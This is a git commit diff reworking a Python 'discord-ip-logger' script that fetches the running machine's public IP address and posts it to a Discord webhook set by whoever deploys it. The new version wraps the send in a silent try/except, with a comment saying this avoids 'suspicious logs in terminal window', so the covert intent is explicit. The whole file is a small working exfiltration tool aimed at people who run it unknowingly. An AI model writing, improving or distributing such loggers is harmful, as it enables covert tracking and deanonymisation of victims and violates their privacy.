0fcb31e96f148ca61119e118787e0238ac39e8e2
Amethist <77743895+meth1337@users.noreply.github.com>
2022-06-22 16:00:45 +0300

    1 // Full rework // Logger script

--- main.py
+++ main.py
@@ -1,11 +1,15 @@
-'''Credits: meth1337/amethist'''
-
+# Libraries
 from discord_webhook import DiscordWebhook
 import requests
 
-r = requests.get(url='http://httpbin.org/ip').json()
-ip = r['origin']
+# Needed variables
+request = requests.get(url="http://httpbin.org/ip").json()  # A request to link with data about machine ip, formatted to json 
+ip = request["origin"]  # Variable containing info about ip address
+github_url = "https://github.com/meth1337/discord-ip-logger"  # Link to github repository
+webhook_url = "discord webhook url here"
 
-
-webhook = DiscordWebhook(url='your discord webhook url here', content=((ip) + '\nlogged by https://github.com/r3s1l13nt/discord-ip-logger/'))
-webhook.execute()
+try:
+    webhook = DiscordWebhook(url=webhook_url, content=f"{ip}\nlogged by {github_url}")  # variable containing all needed info about webhook
+    webhook.execute()  # sending a message to webhook
+except:
+    pass  # Not to cause any suspicious logs in terminal window
